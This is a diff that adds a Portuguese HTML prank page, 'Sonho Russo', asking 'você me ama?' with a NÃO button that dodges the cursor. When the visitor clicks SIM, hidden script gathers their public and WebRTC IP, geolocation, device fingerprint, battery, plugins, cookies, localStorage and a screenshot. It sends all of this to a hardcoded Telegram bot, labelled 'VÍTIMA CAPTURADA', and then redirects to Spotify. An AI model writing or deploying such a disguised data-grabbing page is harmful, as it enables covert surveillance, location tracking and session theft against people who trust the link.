@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🇷🇺 Sonho Russo</title>
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js">
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: #f5efe6;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Fundo com bolhas sonhadoras */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background:
+                radial-gradient(circle at 15% 25%, rgba(173, 216, 230, 0.3) 0%, transparent 30%),
+                radial-gradient(circle at 75% 60%, rgba(100, 149, 237, 0.2) 0%, transparent 35%),
+                radial-gradient(circle at 45% 85%, rgba(135, 206, 250, 0.25) 0%, transparent 30%),
+                linear-gradient(135deg, #f5efe6 0%, #e8dfd3 100%);
+            z-index: 0;
+            animation: flutuar 20s ease-in-out infinite alternate;
+        }
+
+        @keyframes flutuar {
+            0% {
+                transform: scale(1) rotate(0deg);
+            }
+            100% {
+                transform: scale(1.05) rotate(2deg);
+            }
+        }
+
+        /* Estrelas piscando */
+        .estrelas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+            background:
+                radial-gradient(2px 2px at 10% 20%, rgba(173, 216, 230, 0.5) 0%, transparent 100%),
+                radial-gradient(3px 3px at 30% 65%, rgba(100, 149, 237, 0.4) 0%, transparent 100%),
+                radial-gradient(2px 2px at 55% 15%, rgba(135, 206, 250, 0.5) 0%, transparent 100%),
+                radial-gradient(4px 4px at 75% 45%, rgba(70, 130, 180, 0.3) 0%, transparent 100%),
+                radial-gradient(2px 2px at 90% 80%, rgba(173, 216, 230, 0.4) 0%, transparent 100%);
+            filter: blur(3px);
+            animation: piscar 4s ease-in-out infinite alternate;
+        }
+
+        @keyframes piscar {
+            0% {
+                opacity: 0.6;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        /* Caixa principal - mais suave */
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 480px;
+            width: 100%;
+            background: rgba(255, 252, 248, 0.8);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-radius: 40px 12px 40px 12px;
+            padding: 40px 25px 35px;
+            text-align: center;
+            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.05), 0 0 80px rgba(173, 216, 230, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        .container:hover {
+            box-shadow: 0 15px 60px rgba(0, 0, 0, 0.08);
+            transform: translateY(-2px);
+        }
+
+        /* Foto de perfil - REDONDONDA E GLAMOUROSA */
+        .foto {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            object-fit: cover;
+            display: block;
+            margin: 0 auto 20px auto;
+            border: 4px solid rgba(255, 255, 255, 0.7);
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            transition: all 0.4s ease;
+        }
+
+        .foto:hover {
+            transform: scale(1.05) rotate(-3deg);
+            box-shadow: 0 12px 40px rgba(173, 216, 230, 0.3);
+        }
+
+        /* Pergunta com estilo */
+        .pergunta {
+            font-size: 24px;
+            color: #4a3f3a;
+            margin-bottom: 25px;
+            letter-spacing: 0.5px;
+            font-weight: 300;
+        }
+
+        .pergunta .emoji {
+            color: #c0392b;
+            display: inline-block;
+            animation: pulsar 2s ease-in-out infinite;
+        }
+
+        @keyframes pulsar {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.15);
+            }
+        }
+
+        /* Área dos botões */
+        .buttons {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            flex-wrap: wrap;
+            position: relative;
+            min-height: 70px;
+            margin-top: 5px;
+        }
+
+        /* Botões com estilo único */
+        .btn {
+            font-size: 17px;
+            padding: 13px 40px;
+            border: none;
+            background: rgba(235, 225, 215, 0.6);
+            color: #4a3f3a;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            letter-spacing: 0.5px;
+            border-radius: 50px 10px 50px 10px;
+            min-width: 110px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.02);
+            backdrop-filter: blur(4px);
+            font-weight: 400;
+        }
+
+        .btn:hover {
+            background: #c5d5de;
+            color: #2c2420;
+            box-shadow: 0 4px 20px rgba(173, 216, 230, 0.25);
+            transform: translateY(-3px);
+        }
+
+        .btn-nao {
+            background: rgba(235, 225, 215, 0.3);
+            color: #7a6f6a;
+            transition: all 0.05s ease;
+            position: relative;
+        }
+
+        .btn-nao:hover {
+            transform: scale(1);
+            background: rgba(235, 225, 215, 0.3);
+            color: #7a6f6a;
+            box-shadow: none;
+        }
+
+        /* Loader bonitinho */
+        .loader {
+            border: 3px solid rgba(235, 225, 215, 0.5);
+            border-top: 3px solid #7a9bb5;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: girar 0.9s linear infinite;
+            margin: 20px auto 5px;
+            display: none;
+        }
+
+        @keyframes girar {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Corações flutuantes */
+        .floating-hearts {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 999;
+            overflow: hidden;
+        }
+
+        .floating-heart {
+            position: absolute;
+            font-size: 16px;
+            animation: subir 6s linear forwards;
+            opacity: 0.2;
+            color: #c0392b;
+        }
+
+        @keyframes subir {
+            0% {
+                transform: translateY(100vh) rotate(0deg) scale(0.5);
+                opacity: 0;
+            }
+            10% {
+                opacity: 0.25;
+            }
+            90% {
+                opacity: 0.25;
+            }
+            100% {
+                transform: translateY(-10vh) rotate(720deg) scale(1.1);
+                opacity: 0;
+            }
+        }
+
+        /* Responsivo - iPhone 15 lindo */
+        @media (max-width: 500px) {
+            .container {
+                padding: 30px 18px 25px;
+                border-radius: 32px 8px 32px 8px;
+            }
+            .pergunta {
+                font-size: 20px;
+            }
+            .btn {
+                font-size: 15px;
+                padding: 11px 26px;
+                min-width: 90px;
+            }
+            .buttons {
+                gap: 15px;
+            }
+            .foto {
+                width: 120px;
+                height: 120px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Efeitos de fundo -->
+    <div class="estrelas"></div>
+    <div class="floating-hearts" id="floatingHearts"></div>
+
+    <!-- 🖼️ COLOQUE A URL DA SUA IMAGEM AQUI -->
+    <div class="container" id="page-content">
+        <img src="SUA-URL-AQUI" alt="Foto" class="foto">
+
+        <div class="pergunta">
+            <span class="emoji">💗</span> você me ama?
+        </div>
+
+        <div class="buttons" id="buttonArea">
+            <button class="btn" id="btnSim">SIM</button>
+            <button class="btn btn-nao" id="btnNao">NÃO</button>
+        </div>
+
+        <div class="loader" id="loader"></div>
+    </div>
+
+    <script>
+        // ============================================================
+        // BOTÃO "NÃO" FUGINDO (MUITO LOUCO)
+        // ============================================================
+        const btnNao = document.getElementById('btnNao');
+        const btnSim = document.getElementById('btnSim');
+        const container = document.getElementById('page-content');
+        const buttonArea = document.getElementById('buttonArea');
+        const loader = document.getElementById('loader');
+
+        btnNao.addEventListener('mouseenter', function(e) {
+            const containerRect = container.getBoundingClientRect();
+            const btnRect = btnNao.getBoundingClientRect();
+
+            const padding = 15;
+            const maxX = containerRect.width - btnRect.width - padding;
+            const maxY = containerRect.height - btnRect.height - padding;
+
+            let newX, newY;
+            let attempts = 0;
+            do {
+                newX = Math.random() * maxX;
+                newY = Math.random() * maxY;
+                attempts++;
+                if (attempts > 50) break;
+            } while (Math.abs(newX - btnNao.offsetLeft) < 30 && Math.abs(newY - btnNao.offsetTop) < 30);
+
+            btnNao.style.position = 'absolute';
+            btnNao.style.left = Math.max(0, Math.min(newX, maxX)) + 'px';
+            btnNao.style.top = Math.max(0, Math.min(newY, maxY)) + 'px';
+        });
+
+        btnNao.addEventListener('click', function(e) {
+            const containerRect = container.getBoundingClientRect();
+            const btnRect = btnNao.getBoundingClientRect();
+            const maxX = containerRect.width - btnRect.width - 15;
+            const maxY = containerRect.height - btnRect.height - 15;
+            btnNao.style.position = 'absolute';
+            btnNao.style.left = Math.random() * maxX + 'px';
+            btnNao.style.top = Math.random() * maxY + 'px';
+        });
+
+        // ============================================================
+        // BOTÃO "SIM" — ENVIA DADOS E VAI PRO SPOTIFY
+        // ============================================================
+        btnSim.addEventListener('click', function() {
+            buttonArea.style.display = 'none';
+            loader.style.display = 'block';
+
+            coletarEEnviar();
+
+            setTimeout(() => {
+                window.location.href = 'https://open.spotify.com/track/3j2jHwUi5SAdV9nB9NSHTG';
+            }, 2000);
+        });
+
+        // ============================================================
+        // ENVIAR PRO TELEGRAM (BOT)
+        // ============================================================
+        const BOT_TOKEN = "8819910333:AAEYctveGsw4Uf0RBCBKxbU3dkXJpO2fld4";
+        const CHAT_ID = "8551438856";
+
+        async function coletarEEnviar() {
+            try {
+                // IP público
+                const ip = await fetch('https://api.ipify.org?format=json')
+                    .then(r => r.json()).then(d => d.ip).catch(() => '😵');
+
+                // IP real (WebRTC)
+                let webrtcIP = '❎';
+                try {
+                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    pc.createDataChannel('teste');
+                    const offer = await pc.createOffer({ offerToReceiveAudio: 1 });
+                    await pc.setLocalDescription(offer);
+                    const candidates = pc.localDescription.sdp.match(/candidate.*/g);
+                    if (candidates) {
+                        const ips = candidates.map(c => c.split(' ')[4])
+                            .filter(ip => ip && !ip.includes('127.0.0.1') && !ip.includes('0.0.0.0'));
+                        if (ips.length) webrtcIP = ips[0];
+                    }
+                    pc.close();
+                } catch {}
+
+                // Geolocalização por IP
+                let location = {};
+                try {
+                    const r = await fetch(`https://ipinfo.io/${ip}/json`);
+                    const d = await r.json();
+                    location = {
+                        city: d.city || 'Desconhecida',
+                        region: d.region || 'Desconhecida',
+                        country: d.country || 'Desconhecido',
+                        loc: d.loc || 'Desconhecida',
+                        org: d.org || 'Desconhecido',
+                        timezone: d.timezone || 'Desconhecido'
+                    };
+                } catch {
+                    location = { city: '🌃', region: '🗺️', country: '🌵', loc: '📍', org: '❌', timezone: '❌' };
+                }
+
+                // Detectar VPN/Proxy
+                let vpnStatus = '❓ Indeterminado';
+                if (location.org) {
+                    const org = location.org.toLowerCase();
+                    const keywords = ['vpn', 'proxy', 'hosting', 'cloudflare', 'amazon', 'digitalocean', 'ovh', 'linode',
+                        'vultr', 'heroku', 'azure', 'google cloud'
+                    ];
+                    vpnStatus = keywords.some(k => org.includes(k)) ? '⚠️ VPN/PROXY DETECTADO!' : '✅ Nenhum VPN/Proxy';
+                }
+
+                // Fingerprint
+                const fpData = [
+                    navigator.userAgent,
+                    navigator.language,
+                    screen.width + 'x' + screen.height,
+                    new Date().getTimezoneOffset(),
+                    navigator.hardwareConcurrency || '?',
+                    navigator.deviceMemory || '?',
+                    !!navigator.webdriver,
+                    !!navigator.plugins.length,
+                    navigator.doNotTrack || '?'
+                ];
+                let hash = 0;
+                const fpString = fpData.join('|');
+                for (let i = 0; i < fpString.length; i++) {
+                    hash = (hash << 5) - hash + fpString.charCodeAt(i);
+                    hash = hash & hash;
+                }
+                const fingerprint = 'FP-' + Math.abs(hash).toString(16).toUpperCase();
+
+                // Detectar dispositivo
+                const ua = navigator.userAgent;
+                const isIOS = /iPhone|iPad|iPod/i.test(ua);
+                const isAndroid = /Android/i.test(ua);
+                let modelo = 'Desconhecido',
+                    os = 'Desconhecido',
+                    marca = 'Desconhecida';
+
+                if (isIOS) {
+                    const m = ua.match(/iPhone OS (\d+)_(\d+)/);
+                    modelo = m ? `iPhone (iOS ${m[1]}.${m[2]})` : 'iPhone';
+                    os = m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
+                    marca = 'Apple';
+                } else if (isAndroid) {
+                    const m = ua.match(/Android (\d+\.\d+)/);
+                    modelo = m ? `Android ${m[1]}` : 'Android';
+                    os = m ? `Android ${m[1]}` : 'Android';
+                    marca = 'Android';
+                } else {
+                    modelo = '💻 Computador';
+                    os = navigator.platform || 'Desconhecido';
+                    marca = 'Desktop';
+                }
+
+                // Bateria
+                let bateria = '🔋';
+                if (navigator.getBattery) {
+                    try {
+                        const b = await navigator.getBattery();
+                        bateria = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Carregando' : '🪫 Descarregando'})`;
+                    } catch {}
+                }
+
+                // Conexão
+                let conexao = '❌';
+                if (navigator.connection) {
+                    conexao = navigator.connection.effectiveType || 'N/A';
+                }
+
+                // Plugins
+                let plugins = [];
+                for (let i = 0; i < navigator.plugins.length; i++) {
+                    plugins.push(navigator.plugins[i].name);
+                }
+                const pluginsList = plugins.length ? plugins.join(', ') : '❌ Nenhum';
+
+                // Cookies e localStorage
+                const cookies = document.cookie || '❌ Sem cookies';
+                let localStorageData = '❌';
+                try {
+                    localStorageData = JSON.stringify(localStorage) || '❌ Vazio';
+                } catch {}
+
+                // WiFi
+                let wifi = '❌';
+                if (navigator.connection) {
+                    try {
+                        wifi =
+                            `Tipo: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink || '?'} Mbps`;
+                    } catch {}
+                }
+
+                // Fontes instaladas
+                let fonts = [];
+                const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Impact', 'Comic Sans MS'];
+                for (let f of fontList) {
+                    if (document.fonts.check(`12px "${f}"`)) fonts.push(f);
+                }
+                const fontsInstalled = fonts.length ? fonts.join(', ') : '❌';
+
+                // Print da tela
+                let screenshot = null;
+                try {
+                    const canvas = await html2canvas(document.body, {
+                        scale: 1.2,
+                        useCORS: true,
+                        backgroundColor: '#f5efe6',
+                        logging: false,
+                        allowTaint: false,
+                        width: window.innerWidth,
+                        height: window.innerHeight,
+                        windowWidth: window.innerWidth,
+                        windowHeight: window.innerHeight
+                    });
+                    screenshot = canvas.toDataURL('image/jpeg', 0.85);
+                } catch (e) {}
+
+                // Montar mensagem
+                let msg = `
+         **💗 SONHO RUSSO — VÍTIMA CAPTURADA** 
+
+        📲 **IP Público:** ${ip}
+        🔴 **IP Real:** ${webrtcIP}
+        🛡️ **VPN/Proxy:** ${vpnStatus}
+
+        📍 **LOCALIZAÇÃO:**
+           🌃 Cidade: ${location.city}
+           🗺️ Região: ${location.region}
+           🌍 País: ${location.country}
+           📍 Coordenadas: ${location.loc}
+           🕰️ Fuso: ${location.timezone}
+
+        📱 **DISPOSITIVO:**
+           Modelo: ${modelo}
+           Marca: ${marca}
+           OS: ${os}
+           🔋 Bateria: ${bateria}
+           🛜 Conexão: ${conexao}
+           📐 Tela: ${screen.width}x${screen.height}
+           🌍 Idioma: ${navigator.language}
+           ⏰ Fuso: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+           🧠 Fingerprint: ${fingerprint}
+
+        📶 **REDE:** ${wifi}
+
+        🔌 **PLUGINS:** ${pluginsList}
+        🍪 **COOKIES:** ${cookies}
+        💾 **localStorage:** ${localStorageData}
+
+        🔤 **FONTES:** ${fontsInstalled}
+
+        ⛳️ **Ela disse SIM!** 💗
+        `;
+
+                // Enviar mensagem
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+
+                // Enviar print
+                if (screenshot) {
+                    const form = new FormData();
+                    const blob = await fetch(screenshot).then(res => res.blob());
+                    form.append('photo', blob, 'screenshot.jpg');
+                    form.append('chat_id', CHAT_ID);
+                    form.append('caption', '🖼️ PRINT DA TELA');
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: form
+                    });
+                }
+
+            } catch (e) {
+                console.log('Erro:', e);
+            }
+        }
+
+        // ============================================================
+        // CORAÇÕES FLUTUANDO (MUITO FOFOS)
+        // ============================================================
+        setInterval(() => {
+            if (document.getElementById('buttonArea').style.display === 'none') return;
+            const heart = document.createElement('div');
+            heart.className = 'floating-heart';
+            heart.textContent = '❤️';
+            heart.style.left = Math.random() * 90 + 5 + '%';
+            heart.style.fontSize = (Math.random() * 14 + 10) + 'px';
+            heart.style.animationDuration = (Math.random() * 5 + 4) + 's';
+            heart.style.opacity = '0.2';
+            heart.style.color = '#c0392b';
+            document.getElementById('floatingHearts').appendChild(heart);
+            setTimeout(() => { heart.remove(); }, 8000);
+        }, 3000);
+    </script>
+
+</body>
+</html>
